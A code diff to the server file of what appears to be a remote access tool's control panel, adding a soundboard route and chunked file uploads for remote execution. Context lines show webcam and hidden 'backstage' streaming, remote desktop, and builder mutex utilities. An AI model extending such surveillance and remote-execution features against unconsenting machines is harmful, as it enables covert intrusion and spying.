@@ -46,6 +46,7 @@ import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
 import { handleWebrtcRoutes } from "./server/routes/webrtc-routes";
 import { handleRemoteDesktopRecordingRoutes } from "./server/routes/rd-recording-routes";
 import { handleWallpaperRoutes } from "./server/routes/wallpaper-routes";
+import { handleSoundboardRoutes } from "./server/routes/soundboard-routes";
 import { handleRemoteExecuteRoutes } from "./server/routes/remote-execute-routes";
 import { isAuthorizedAgentRequest } from "./server/agent-auth";
 import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
@@ -439,6 +440,20 @@ type PendingCommandReply = {
 };
 const pendingCommandReplies = new Map<string, PendingCommandReply>();
 
+type PendingFileUploadChunk = {
+  resolve: (result: {
+    ok: boolean;
+    offset?: number;
+    received?: number;
+    total?: number;
+    error?: string;
+  }) => void;
+  reject: (error: Error) => void;
+  timeout: NodeJS.Timeout;
+  clientId: string;
+};
+const pendingFileUploadChunks = new Map<string, PendingFileUploadChunk>();
+
 async function startServer() {
   await loadPluginState();
 
@@ -594,8 +609,15 @@ async function startServer() {
       pendingCommandReplies,
       pendingScripts,
     },
+    soundboard: {
+      DATA_DIR,
+      pendingCommandReplies,
+      pendingScripts,
+    },
     remoteExecute: {
       pendingCommandReplies,
+      pendingScripts,
+      pendingFileUploadChunks,
     },
     wsUpgrade: {
       isAuthorizedAgentRequest: isAuthorizedAgent,
@@ -608,6 +630,7 @@ async function startServer() {
     maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
     pendingScripts,
     pendingCommandReplies,
+    pendingFileUploadChunks,
     rdStreamingState,
     backstageStreamingState,
     webcamStreamingState,
@@ -772,6 +795,7 @@ async function startServer() {
         }),
         (req, url) => handleWebrtcRoutes(req, url),
         (req, url, srv) => handleWallpaperRoutes(req, url, srv as any, routeDeps.wallpaper),
+        (req, url, srv) => handleSoundboardRoutes(req, url, srv as any, routeDeps.soundboard),
         (req, url, srv) => handleRemoteExecuteRoutes(req, url, srv as any, routeDeps.remoteExecute),
         (req, url, srv) => handleClientRoutes(req, url, srv as any, routeDeps.client),
         (req, url, srv) => handleWsUpgradeRoutes(req, url, srv as any, routeDeps.wsUpgrade),
